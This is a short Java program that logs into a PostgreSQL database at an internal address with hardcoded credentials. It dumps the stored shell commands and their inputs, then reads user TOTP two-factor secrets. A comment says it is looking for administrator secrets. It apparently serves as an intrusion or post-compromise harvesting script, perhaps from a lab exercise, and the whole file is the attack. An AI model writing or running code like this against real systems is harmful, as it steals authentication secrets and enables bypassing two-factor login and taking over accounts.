import java.sql.*;
class FD4 {
  public static void main(String[] a) throws Exception {
    Class.forName("org.postgresql.Driver");
    Connection c = DriverManager.getConnection("jdbc:postgresql://10.13.17.248:5501/noxify","noxify","cZskyJqqE7?7V_8=#Ed^");
    Statement s = c.createStatement();
    System.out.println("---SHELL-COMMAND---");
    ResultSet r = s.executeQuery("SELECT * FROM shell_command ORDER BY id");
    ResultSetMetaData md = r.getMetaData();
    for(int i=1;i<=md.getColumnCount();i++) System.out.print(md.getColumnName(i)+"|");
    System.out.println();
    while(r.next()) {
      for(int i=1;i<=md.getColumnCount();i++) {
        String v=r.getString(i);
        System.out.print((v!=null?v.substring(0,Math.min(200,v.length())):"null")+"|");
      }
      System.out.println();
    }
    System.out.println("---SHELL-COMMAND-INPUT---");
    r = s.executeQuery("SELECT * FROM shell_command_input ORDER BY id LIMIT 10");
    md = r.getMetaData();
    for(int i=1;i<=md.getColumnCount();i++) System.out.print(md.getColumnName(i)+"|");
    System.out.println();
    while(r.next()) {
      for(int i=1;i<=md.getColumnCount();i++) {
        String v=r.getString(i);
        System.out.print((v!=null?v.substring(0,Math.min(200,v.length())):"null")+"|");
      }
      System.out.println();
    }
    // Also check user_totp_secret - might have admin TOTP secrets
    System.out.println("---USER-TOTP---");
    r = s.executeQuery("SELECT * FROM user_totp_secret LIMIT 5");
    md = r.getMetaData();
    for(int i=1;i<=md.getColumnCount();i++) System.out.print(md.getColumnName(i)+"|");
    System.out.println();
    while(r.next()) {
      for(int i=1;i<=md.getColumnCount();i++) {
        String v=r.getString(i);
        System.out.print((v!=null?v.substring(0,Math.min(200,v.length())):"null")+"|");
      }
      System.out.println();
    }
    c.close();
  }
}
